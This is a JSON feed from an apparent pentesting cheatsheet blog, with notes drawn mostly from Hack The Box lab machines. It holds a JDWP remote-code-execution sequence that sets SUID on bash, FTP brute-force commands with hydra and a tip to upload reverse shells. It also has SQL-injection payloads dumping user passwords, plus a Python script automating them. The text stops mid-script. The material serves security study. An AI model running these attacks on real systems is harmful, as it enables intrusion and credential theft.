{
    "version": "https://jsonfeed.org/version/1",
    "title": "Spindel",
    "home_page_url": "https://mvineza.github.io/spindel/",
    "feed_url": "https://mvineza.github.io/spindel/feed.json",
    "description": "A minimalist, quick search cybersecurity blog and cheatsheets",
    "icon": "https://mvineza.github.io/spindel/apple-touch-icon.png",
    "favicon": "https://mvineza.github.io/spindel/favicon.ico",
    "expired": false,
    
    "author":  {
        "name": "spindel",
        "url": null,
        "avatar": null
    },
    
"items": [
    
        {
            "id": "https://mvineza.github.io/spindel/2022/07/05/ssl-heartbleed",
            "title": "SSL Heartbleed",
            "summary": "SSL Heartbleed",
            "content_text": "OverviewThe SSL standard includes a heartbeat option, which allows a computer at one end of an SSL connection to send a short message to verify that the other computer is still online and get a response back. Researchers found that it’s possible to send a cleverly formed, malicious heartbeat message that tricks the computer at the other end into divulging secret information. Specifically, a vulnerable computer can be tricked into transmitting the contents of the server’s memory, known as RAM.CVE-2014-0160Versions Affected  SSL V3Public Exlploitsyou may need to run exploits multiple times to capture some output  from server memory such as scheduled processes  GitHub - mpgn/heartbleed-PoC: Hearbleed exploit to retrieve sensitive information CVE-2014-0160References  The Heartbleed Bug, explained - Vox  xkcd: Heartbleed Explanation",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>The SSL standard includes a heartbeat option, which allows a computer at one end of an SSL connection to send a short message to verify that the other computer is still online and get a response back. Researchers found that it’s possible to send a cleverly formed, malicious heartbeat message that tricks the computer at the other end into divulging secret information. Specifically, a vulnerable computer can be tricked into transmitting the contents of the server’s memory, known as RAM.</p><p>CVE-2014-0160</p><p><img src=\"/spindel/assets/SSL%20Heartbleed/B780A93A-3E92-4ECC-AA5B-7129256A4A85.png\" alt=\"\" /></p><h2 id=\"versions-affected\">Versions Affected</h2><ul>  <li>SSL V3</li></ul><h2 id=\"public-exlploits\">Public Exlploits</h2><p><strong>you may need to run exploits multiple times to capture some output  from server memory such as scheduled processes</strong></p><ul>  <li><a href=\"https://github.com/mpgn/heartbleed-PoC\">GitHub - mpgn/heartbleed-PoC: Hearbleed exploit to retrieve sensitive information CVE-2014-0160</a></li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://www.vox.com/2014/6/19/18076318/heartbleed\">The Heartbleed Bug, explained - Vox</a></li>  <li><a href=\"https://xkcd.com/1354/\">xkcd: Heartbleed Explanation</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/07/05/ssl-heartbleed",
            
            
            
            "tags": ["ssl","network"],
            
            "date_published": "2022-07-05T00:00:00+08:00",
            "date_modified": "2022-07-05T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/27/papercut-print-logger",
            "title": "Papercut Print Logger",
            "summary": "Papercut Print Logger",
            "content_text": "Overview  Print management software  Shows print logs  The idea behind Papercut is pretty neat, a user can submit a print job to a Papercut printer, and walk to any physical printer they are nearby and release the print job. Users don’t have to select from dozens of printers and hope they get the right oneReference: Death By a Thousand Papercuts – Security Ops and Researcher BlogPorts  9191/tcp  9192/tcpInteresting URL Paths# admin login to management functions) (lost the admin password?/admin# end-user login so users can review their own print activity, etc./user# central reports login/central-reports# admin login for the Web Cashier module/webcashier# admin login for release functionalityhttp://papercutserver:9191/releaseInteresting Files and Directories# contains hashed admin credentialsserver.properties# othersC:\\Program Files\\PaperCut Print Logger\\papercut-logger.confReferences  HTB Fuse  Security vulnerability information and common security questions - PaperCut  Monitor with PaperCut print logger everything that comes out of the printer on your computer",
            "content_html": "<h2 id=\"overview\">Overview</h2><ul>  <li>Print management software</li>  <li>Shows print logs</li></ul><p><img src=\"/spindel/assets/Papercut%20Print%20Logger/A4FC4428-8700-4923-A0BC-61A5EED2AA15.png\" alt=\"\" /></p><blockquote>  <p>The idea behind Papercut is pretty neat, a user can submit a print job to a Papercut printer, and walk to any physical printer they are nearby and release the print job. Users don’t have to select from dozens of printers and hope they get the right one</p></blockquote><p>Reference: <a href=\"https://redblue42.code42.com/death-by-a-thousand-papercuts/\">Death By a Thousand Papercuts – Security Ops and Researcher Blog</a></p><h2 id=\"ports\">Ports</h2><ul>  <li>9191/tcp</li>  <li>9192/tcp</li></ul><h2 id=\"interesting-url-paths\">Interesting URL Paths</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># admin login to management functions) (lost the admin password?</span><span class=\"w\"></span><span class=\"n\">/admin</span><span class=\"w\"></span><span class=\"c\"># end-user login so users can review their own print activity, etc.</span><span class=\"w\"></span><span class=\"n\">/user</span><span class=\"w\"></span><span class=\"c\"># central reports login</span><span class=\"w\"></span><span class=\"n\">/central-reports</span><span class=\"w\"></span><span class=\"c\"># admin login for the Web Cashier module</span><span class=\"w\"></span><span class=\"n\">/webcashier</span><span class=\"w\"></span><span class=\"c\"># admin login for release functionality</span><span class=\"w\"></span><span class=\"n\">http://papercutserver:9191/release</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-powershell highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># contains hashed admin credentials</span><span class=\"w\"></span><span class=\"n\">server.properties</span><span class=\"w\"></span><span class=\"c\"># others</span><span class=\"w\"></span><span class=\"n\">C:\\Program</span><span class=\"w\"> </span><span class=\"nx\">Files\\PaperCut</span><span class=\"w\"> </span><span class=\"nx\">Print</span><span class=\"w\"> </span><span class=\"nx\">Logger\\papercut-logger.conf</span><span class=\"w\"></span></code></pre></div></div><h2 id=\"references\">References</h2><ul>  <li>HTB Fuse</li>  <li><a href=\"https://www.papercut.com/kb/Main/CommonSecurityQuestions#general-security-questions\">Security vulnerability information and common security questions - PaperCut</a></li>  <li><a href=\"https://www.youtube.com/watch?v=fpKfILnsdM0\">Monitor with PaperCut print logger everything that comes out of the printer on your computer</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/27/papercut-print-logger",
            
            
            
            "tags": ["enum","printers","windows"],
            
            "date_published": "2022-06-27T00:00:00+08:00",
            "date_modified": "2022-06-27T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/26/java-debug-wire-protocol-jdwp",
            "title": "Java Debug Wire Protocol (JDWP)",
            "summary": "Java Debug Wire Protocol (JDWP)",
            "content_text": "StartupThis is included on tomcat startup parameters. Example./usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties [...redacted...]-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n [...redacted...]Attacks  Privesc RCE if tomcat is running as root - this finds the java.lang.Runtime.getRuntime() to invoke exec() passing a string objectManual Exploitation of RCEjdb -attach 127.0.0.1:8000&gt; stop in javax.GenericServlet.init()&gt; Set deferred breakpoint javax.servlet.GenericServlet.init()main[1] eval new java.lang.Runtime().exec(\"chmod +s /bin/bash\")Tips  If exploit is not working, ensure that tomcat is hitting a breakpoint. For example restart tomcat.References  Hacktricks - Pentesting JDWP",
            "content_html": "<h2 id=\"startup\">Startup</h2><p>This is included on tomcat startup parameters. Example.</p><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>/usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties [...redacted...]-agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n [...redacted...]</code></pre></div></div><h2 id=\"attacks\">Attacks</h2><ul>  <li>Privesc RCE if tomcat is running as root - this finds the <code class=\"language-plaintext highlighter-rouge\">java.lang.Runtime.getRuntime()</code> to invoke <code class=\"language-plaintext highlighter-rouge\">exec()</code> passing a string object</li></ul><h2 id=\"manual-exploitation-of-rce\">Manual Exploitation of RCE</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>jdb <span class=\"nt\">-attach</span> 127.0.0.1:8000<span class=\"o\">&gt;</span> stop <span class=\"k\">in </span>javax.GenericServlet.init<span class=\"o\">()</span><span class=\"o\">&gt;</span> Set deferred breakpoint javax.servlet.GenericServlet.init<span class=\"o\">()</span>main[1] <span class=\"nb\">eval </span>new java.lang.Runtime<span class=\"o\">()</span>.exec<span class=\"o\">(</span><span class=\"s2\">\"chmod +s /bin/bash\"</span><span class=\"o\">)</span></code></pre></div></div><h2 id=\"tips\">Tips</h2><ul>  <li>If exploit is not working, ensure that tomcat is hitting a breakpoint. For example restart tomcat.</li></ul><h2 id=\"references\">References</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-jdwp-java-debug-wire-protocol\">Hacktricks - Pentesting JDWP</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/26/java-debug-wire-protocol-jdwp",
            
            
            
            "tags": ["java","enum"],
            
            "date_published": "2022-06-26T00:00:00+08:00",
            "date_modified": "2022-06-26T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/13/ftp",
            "title": "FTP",
            "summary": "FTP",
            "content_text": "Initial# kickoff nmap nse ftp scriptsnmap -p21 --script ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum 10.10.10.130# or just simply\tFTP Commands# Make sure you include hidden files and directoriesls -laInteresting Files and Directories# Contains list of disallowed users/etc/ftpusers# FTP Root location in Windowsc:\\inetpub\\ftprootUsername enumeration# https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl~/data/tools/ftp-user-enum.pl -U users.txt -t 172.16.177.4Credentials  Try some anonymous logins# manual authenticationanonymous / anonymousanonymous /ftp / ftpftpuser / ftpuser# via nmapnmap -p21 --script ftp-anon 10.10.51.236  Try bruteforce# user and pass list can be extracted from# /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txtcat /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | cut -d':' -f1 &gt; users.txtcat /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | cut -d':' -f2 &gt; passwords.txthydra -V -f -L users.txt -P passwords.txt ftp://10.10.10.46 -u -vV# try also nmapnmap -p21 10.10.10.46 --script ftp-bruteDownloading files# Make sure turn on binary mode on files such as# executablesftp&gt; binary200 Type set to I.ftp&gt; mget *mget chatserver.exe? y# using wgetwget -m --no-passive ftp://anonymous:anonymous@access.htb# Recursive - sometimes this hangs, so just retry againwget -r ftp://user:pass@server.comwget -r --no-passive ftp://user:pass@server.com/wget -r ftp://user:pass@server.com/etcUploading files  When a web server resources are hosted also on FTP, try to upload a reverse shell and access that reverse shell on the websiteFinding Exploits# via expoitdbsearchsploit vsftpdTroubleshooting  This error appeared in HTB Carrier. Type passive to resolve it.Connected to 10.120.15.10.220 (vsFTPd 3.0.3)Name (10.120.15.10:root): 331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir500 Illegal PORT command.ftp: bind: Address already in useftp&gt;Other resources  21 - Pentesting FTP - HackTricks",
            "content_html": "<h2 id=\"initial\">Initial</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># kickoff nmap nse ftp scripts</span>nmap <span class=\"nt\">-p21</span> <span class=\"nt\">--script</span> ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum 10.10.10.130<span class=\"c\"># or just simply</span>\t</code></pre></div></div><h2 id=\"ftp-commands\">FTP Commands</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Make sure you include hidden files and directories</span><span class=\"nb\">ls</span> <span class=\"nt\">-la</span></code></pre></div></div><h2 id=\"interesting-files-and-directories\">Interesting Files and Directories</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Contains list of disallowed users</span>/etc/ftpusers<span class=\"c\"># FTP Root location in Windows</span>c:<span class=\"se\">\\i</span>netpub<span class=\"se\">\\f</span>tproot</code></pre></div></div><h2 id=\"username-enumeration\">Username enumeration</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># https://raw.githubusercontent.com/pentestmonkey/ftp-user-enum/master/ftp-user-enum.pl</span>~/data/tools/ftp-user-enum.pl <span class=\"nt\">-U</span> users.txt <span class=\"nt\">-t</span> 172.16.177.4</code></pre></div></div><h2 id=\"credentials\">Credentials</h2><ul>  <li>Try some anonymous logins</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># manual authentication</span>anonymous / anonymousanonymous /ftp / ftpftpuser / ftpuser<span class=\"c\"># via nmap</span>nmap <span class=\"nt\">-p21</span> <span class=\"nt\">--script</span> ftp-anon 10.10.51.236</code></pre></div></div><ul>  <li>Try bruteforce</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># user and pass list can be extracted from</span><span class=\"c\"># /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt</span><span class=\"nb\">cat</span> /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">':'</span> <span class=\"nt\">-f1</span> <span class=\"o\">&gt;</span> users.txt<span class=\"nb\">cat</span> /usr/share/legion/wordlists/ftp-betterdefaultpasslist.txt | <span class=\"nb\">cut</span> <span class=\"nt\">-d</span><span class=\"s1\">':'</span> <span class=\"nt\">-f2</span> <span class=\"o\">&gt;</span> passwords.txthydra <span class=\"nt\">-V</span> <span class=\"nt\">-f</span> <span class=\"nt\">-L</span> users.txt <span class=\"nt\">-P</span> passwords.txt ftp://10.10.10.46 <span class=\"nt\">-u</span> <span class=\"nt\">-vV</span><span class=\"c\"># try also nmap</span>nmap <span class=\"nt\">-p21</span> 10.10.10.46 <span class=\"nt\">--script</span> ftp-brute</code></pre></div></div><h2 id=\"downloading-files\">Downloading files</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Make sure turn on binary mode on files such as</span><span class=\"c\"># executables</span>ftp&gt; binary200 Type <span class=\"nb\">set </span>to I.ftp&gt; mget <span class=\"k\">*</span>mget chatserver.exe? y<span class=\"c\"># using wget</span>wget <span class=\"nt\">-m</span> <span class=\"nt\">--no-passive</span> ftp://anonymous:anonymous@access.htb<span class=\"c\"># Recursive - sometimes this hangs, so just retry again</span>wget <span class=\"nt\">-r</span> ftp://user:pass@server.comwget <span class=\"nt\">-r</span> <span class=\"nt\">--no-passive</span> ftp://user:pass@server.com/wget <span class=\"nt\">-r</span> ftp://user:pass@server.com/etc</code></pre></div></div><h2 id=\"uploading-files\">Uploading files</h2><ul>  <li>When a web server resources are hosted also on FTP, try to upload a reverse shell and access that reverse shell on the website</li></ul><h2 id=\"finding-exploits\">Finding Exploits</h2><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># via expoitdb</span>searchsploit vsftpd</code></pre></div></div><h2 id=\"troubleshooting\">Troubleshooting</h2><ul>  <li>This error appeared in HTB Carrier. Type <code class=\"language-plaintext highlighter-rouge\">passive</code> to resolve it.</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>Connected to 10.120.15.10.220 (vsFTPd 3.0.3)Name (10.120.15.10:root): 331 Please specify the password.Password:230 Login successful.Remote system type is UNIX.Using binary mode to transfer files.ftp&gt; dir500 Illegal PORT command.ftp: bind: Address already in useftp&gt;</code></pre></div></div><h2 id=\"other-resources\">Other resources</h2><ul>  <li><a href=\"https://book.hacktricks.xyz/pentesting/pentesting-ftp\">21 - Pentesting FTP - HackTricks</a></li></ul>",
            "url": "https://mvineza.github.io/spindel/2022/06/13/ftp",
            
            
            
            "tags": ["ftp","enum"],
            
            "date_published": "2022-06-13T00:00:00+08:00",
            "date_modified": "2022-06-13T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/12/xss-and-deserialization-chain-attack",
            "title": "XSS and Deserialization Chain Attack",
            "summary": "XSS and Deserialization Chain Attack",
            "content_text": "OverviewThis attack was from HTB Cereal which performs a deserializaton attack. In order to execute the deserialization payload, an XSS payload must be triggered to bypass the IP restriction.This attack also makes use of a forged JWT token.The method here came from 0xdf writeup.",
            "content_html": "<h2 id=\"overview\">Overview</h2><p>This attack was from HTB Cereal which performs a deserializaton attack. In order to execute the deserialization payload, an XSS payload must be triggered to bypass the IP restriction.</p><p>This attack also makes use of a forged JWT token.</p><p><img src=\"/spindel/assets/XSS%20and%20Deserialization%20Chain%20Attack/628EB962-448D-40D8-B32F-537C8811796D.png\" alt=\"\" /></p><p>The method here came from 0xdf <a href=\"https://0xdf.gitlab.io/2021/05/29/htb-cereal.html\">writeup</a>.</p>",
            "url": "https://mvineza.github.io/spindel/2022/06/12/xss-and-deserialization-chain-attack",
            
            
            
            "tags": ["xss","deserial","dotnet","jwt","windows"],
            
            "date_published": "2022-06-12T00:00:00+08:00",
            "date_modified": "2022-06-12T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/11/access-adb-as-root",
            "title": "Access ADB as root",
            "summary": "Access ADB as root",
            "content_text": "  Do local port forwarding so you can access abd shell on localhostssh kristi@htb -p 2222 -L 5555:localhost:5555  Connect to adb shelladb connect localhost:5555  Verify➜  explore adb devices               List of devices attachedhtb:2222\tofflinelocalhost:5555\tdevice  Enjoyadb -s localhost shell127|x86_64:/ $ whoamishellx86_64:/ $ su:/ # cat data/root.txtf04fc82b6d49b41c9b08982be59338c5:/ #",
            "content_html": "<ul>  <li>Do local port forwarding so you can access abd shell on localhost</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>ssh kristi@htb <span class=\"nt\">-p</span> 2222 <span class=\"nt\">-L</span> 5555:localhost:5555</code></pre></div></div><ul>  <li>Connect to adb shell</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>adb connect localhost:5555</code></pre></div></div><ul>  <li>Verify</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>➜  explore adb devices               List of devices attachedhtb:2222\tofflinelocalhost:5555\tdevice</code></pre></div></div><ul>  <li>Enjoy</li></ul><div class=\"language-plaintext highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code>adb -s localhost shell127|x86_64:/ $ whoamishellx86_64:/ $ su:/ # cat data/root.txtf04fc82b6d49b41c9b08982be59338c5:/ #</code></pre></div></div>",
            "url": "https://mvineza.github.io/spindel/2022/06/11/access-adb-as-root",
            
            
            
            "tags": ["android","privesc","mobile"],
            
            "date_published": "2022-06-11T00:00:00+08:00",
            "date_modified": "2022-06-11T00:00:00+08:00",
            
                "author":  {
                "name": "spindel",
                "url": null,
                "avatar": null
                }
                
            
        },
    
        {
            "id": "https://mvineza.github.io/spindel/2022/06/08/ai",
            "title": "AI",
            "summary": "AI",
            "content_text": "Sample PHP Pseudo Code$voice = new play('file.wav');$result = $voice-&gt;recognise(\"Good Morning\");if ($result) {   echo \"Matched Good Morning\";   //flag to database or csv } else {   echo \"No match found\"; }Attacks                              [Text-To-Speech speaks pwned          Flanker Sky](https://blog.flanker017.me/text-to-speech-speaks-pwned/)                      Alexa Can Be Hacked with SQL Injection to Give Away Private Info - IoT Tech TrendsTools                              [Text to speech free online          Text to mp3, Text to wav](https://www.texttospeechfree.com/)                      Text 2 Speech - Includes more voices such as Male US, I used this in HTB Ai  Flite - Command line equivalent of Text 2 Speech# Generates WAV file from Male US voiceflite -voice rms \"hello world\" a.wav  text2wav - similar to fliteecho \"Hello open single quote\" | text2wave -o ai.wavVoice to SQL  GitHub - Shravankumarhiregoudar/Speech-to-SQL-Research-Paper                              [Just Speak SQL          ADA Lab Blog](https://adalabucsd.github.io/research-blog/research/2020/06/14/speakql.html)                    Speech to SQL Queries and Payloads  From HTB AI:  Windows Speech Recognition commands  Some custom payloads from HTB AI (See python script below for reference):# I didn't see any speech to text command for \"select\" in# microsoft website but this works in this form.# Result:#  &lt;h3&gt;Our understanding of your input is : 'union select 1 -- -&lt;br /&gt;Query result : 1&lt;h3&gt;./sqli.py \"open single quote union select 1 comment database\"# Here, \"select\" and \"password\" was combined to \"selectpassword\"# Result: H,Sq9t6}a&lt;)?q93_./sqli.py \"open single quote union selectpassword from users comment database\"# Adding \"space\" to get username# Result: &lt;h3&gt;Our understanding of your input is : 'union select   username from users -- -&lt;br /&gt;Query result : alexa&lt;h3&gt;./sqli.py \"open single quote union select space username from users comment database\"  From HTB AI official walkthrough' union select password from users#Python script to automate upload of WAV File#!/usr/bin/env python3import requestsimport osimport sysimport reproxies = {'http': 'http://127.0.0.1:8080'}url = 'http://ai/ai.php'wav_filename = 'voice.wav'voice_filename = 'voice.txt'try:  query = sys.argv[1]except IndexError:  print('Example Usage: ./sqli.py \"Comment database\"')  sys.exit(0)def generate_wav(query):  with open(voice_filename, 'w') as f:    f.write(query)  os.system('flite -voice rms {} {}'.format(voice_filename, wav_filename))def send_file():  data = {'wav_filename': wav_filename, 'name': 'Submit'}  files = {    'fileToUpload': (wav_filename, open(wav_filename, 'rb')),    'submit': (None, 'Process It!')    }  r = requests.post(url, files=files, proxies=proxies)  sql_response = re.findall('&lt;h3&gt;Our understanding.+&lt;h3&gt;', r.text)[0]  print(sql_response)generate_wav(query)send_file()References  BRA.I.NSMASHER Presentation - HackTricks",
            "content_html": "<h2 id=\"sample-php-pseudo-code\">Sample PHP Pseudo Code</h2><div class=\"language-php highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nv\">$voice</span> <span class=\"o\">=</span> <span class=\"k\">new</span> <span class=\"nc\">play</span><span class=\"p\">(</span><span class=\"s1\">'file.wav'</span><span class=\"p\">);</span><span class=\"nv\">$result</span> <span class=\"o\">=</span> <span class=\"nv\">$voice</span><span class=\"o\">-&gt;</span><span class=\"nf\">recognise</span><span class=\"p\">(</span><span class=\"s2\">\"Good Morning\"</span><span class=\"p\">);</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"nv\">$result</span><span class=\"p\">)</span> <span class=\"p\">{</span>   <span class=\"k\">echo</span> <span class=\"s2\">\"Matched Good Morning\"</span><span class=\"p\">;</span>   <span class=\"c1\">//flag to database or csv</span> <span class=\"p\">}</span> <span class=\"k\">else</span> <span class=\"p\">{</span>   <span class=\"k\">echo</span> <span class=\"s2\">\"No match found\"</span><span class=\"p\">;</span> <span class=\"p\">}</span></code></pre></div></div><h2 id=\"attacks\">Attacks</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[Text-To-Speech speaks pwned</td>          <td>Flanker Sky](https://blog.flanker017.me/text-to-speech-speaks-pwned/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.iottechtrends.com/alexa-hacked-sql-injection/\">Alexa Can Be Hacked with SQL Injection to Give Away Private Info - IoT Tech Trends</a></li></ul><h2 id=\"tools\">Tools</h2><ul>  <li>    <table>      <tbody>        <tr>          <td>[Text to speech free online</td>          <td>Text to mp3, Text to wav](https://www.texttospeechfree.com/)</td>        </tr>      </tbody>    </table>  </li>  <li><a href=\"https://www.text2speech.org/\">Text 2 Speech</a> - Includes more voices such as Male US, I used this in HTB Ai</li>  <li><a href=\"https://github.com/festvox/flite\">Flite</a> - Command line equivalent of <a href=\"https://www.text2speech.org/\">Text 2 Speech</a></li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># Generates WAV file from Male US voice</span>flite <span class=\"nt\">-voice</span> rms <span class=\"s2\">\"hello world\"</span> a.wav</code></pre></div></div><ul>  <li><a href=\"http://manpages.ubuntu.com/manpages/bionic/man1/text2wave.1.html\">text2wav</a> - similar to flite</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"nb\">echo</span> <span class=\"s2\">\"Hello open single quote\"</span> | text2wave <span class=\"nt\">-o</span> ai.wav</code></pre></div></div><h2 id=\"voice-to-sql\">Voice to SQL</h2><ul>  <li><a href=\"https://github.com/Shravankumarhiregoudar/Speech-to-SQL-Research-Paper#:~:text=Speech%20to%20SQL%20query%20generator,connecting%20to%20the%20backend%20database.\">GitHub - Shravankumarhiregoudar/Speech-to-SQL-Research-Paper</a></li>  <li>    <table>      <tbody>        <tr>          <td>[Just Speak SQL</td>          <td>ADA Lab Blog](https://adalabucsd.github.io/research-blog/research/2020/06/14/speakql.html)</td>        </tr>      </tbody>    </table>  </li></ul><h2 id=\"speech-to-sql-queries-and-payloads\">Speech to SQL Queries and Payloads</h2><ul>  <li>From HTB AI:</li></ul><p><img src=\"/spindel/assets/AI/DB424957-B1BF-4C2B-8C56-EFE656773724.png\" alt=\"\" /></p><ul>  <li><a href=\"https://support.microsoft.com/en-us/windows/windows-speech-recognition-commands-9d25ef36-994d-f367-a81a-a326160128c7\">Windows Speech Recognition commands</a></li>  <li>Some custom payloads from HTB AI (See python script below for reference):</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c\"># I didn't see any speech to text command for \"select\" in</span><span class=\"c\"># microsoft website but this works in this form.</span><span class=\"c\"># Result:</span><span class=\"c\">#  &lt;h3&gt;Our understanding of your input is : 'union select 1 -- -&lt;br /&gt;Query result : 1&lt;h3&gt;</span>./sqli.py <span class=\"s2\">\"open single quote union select 1 comment database\"</span><span class=\"c\"># Here, \"select\" and \"password\" was combined to \"selectpassword\"</span><span class=\"c\"># Result: H,Sq9t6}a&lt;)?q93_</span>./sqli.py <span class=\"s2\">\"open single quote union selectpassword from users comment database\"</span><span class=\"c\"># Adding \"space\" to get username</span><span class=\"c\"># Result: &lt;h3&gt;Our understanding of your input is : 'union select   username from users -- -&lt;br /&gt;Query result : alexa&lt;h3&gt;</span>./sqli.py <span class=\"s2\">\"open single quote union select space username from users comment database\"</span></code></pre></div></div><ul>  <li>From HTB AI official walkthrough</li></ul><div class=\"language-bash highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"s1\">' union select password from users#</span></code></pre></div></div><h2 id=\"python-script-to-automate-upload-of-wav-file\">Python script to automate upload of WAV File</h2><div class=\"language-python highlighter-rouge\"><div class=\"highlight\"><pre class=\"highlight\"><code><span class=\"c1\">#!/usr/bin/env python3</span><span class=\"kn\">import</span> <span class=\"nn\">requests</span><span class=\"kn\">import</span> <span class=\"nn\">os</span><span class=\"kn\">import</span> <span class=\"nn\">sys</span><span class=\"kn\">import</span> <span class=\"nn\">re</span><span class=\"n\">proxies</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'http'</span><span class=\"p\">:</span> <span class=\"s\">'http://127.0.0.1:8080'</span><span class=\"p\">}</span><span class=\"n\">url</span> <span class=\"o\">=</span> <span class=\"s\">'http://ai/ai.php'</span><span class=\"n\">wav_filename</span> <span class=\"o\">=</span> <span class=\"s\">'voice.wav'</span><span class=\"n\">voice_filename</span> <span class=\"o\">=</span> <span class=\"s\">'voice.txt'</span><span class=\"k\">try</span><span class=\"p\">:</span>  <span class=\"n\">query</span> <span class=\"o\">=</span> <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"n\">argv</span><span class=\"p\">[</span><span class=\"mi\">1</span><span class=\"p\">]</span><span class=\"k\">except</span> <span class=\"nb\">IndexError</span><span class=\"p\">:</span>  <span class=\"k\">print</span><span class=\"p\">(</span><span class=\"s\">'Example Usage: ./sqli.py \"Comment database\"'</span><span class=\"p\">)</span>  <span class=\"n\">sys</span><span class=\"p\">.</span><span class=\"nb\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">)</span><span class=\"k\">def</span> <span class=\"nf\">generate_wav</span><span class=\"p\">(</span><span class=\"n\">query</span><span class=\"p\">):</span>  <span class=\"k\">with</span> <span class=\"nb\">open</span><span class=\"p\">(</span><span class=\"n\">voice_filename</span><span class=\"p\">,</span> <span class=\"s\">'w'</span><span class=\"p\">)</span> <span class=\"k\">as</span> <span class=\"n\">f</span><span class=\"p\">:</span>    <span class=\"n\">f</span><span class=\"p\">.</span><span class=\"n\">write</span><span class=\"p\">(</span><span class=\"n\">query</span><span class=\"p\">)</span>  <span class=\"n\">os</span><span class=\"p\">.</span><span class=\"n\">system</span><span class=\"p\">(</span><span class=\"s\">'flite -voice rms {} {}'</span><span class=\"p\">.</span><span class=\"nb\">format</span><span class=\"p\">(</span><span class=\"n\">voice_filename</span><span class=\"p\">,</span> <span class=\"n\">wav_filename</span><span class=\"p\">))</span><span class=\"k\">def</span> <span class=\"nf\">send_file</span><span class=\"p\">():</span>  <span class=\"n\">data</span> <span class=\"o\">=</span> <span class=\"p\">{</span><span class=\"s\">'wav_filename'</span><span class=\"p\">:</span> <span class=\"n\">wav_filename</span><span class=\"p\">,</span> <span class=\"s\">'name'</span><span class=\"p\">:</span> <span class=\"s\">'Submit'</span><span class=\"p\">}</span>  <span class=\"n\">files</span> <span class=\"o\">=</span> <span class=\"p\">{</span>    <span 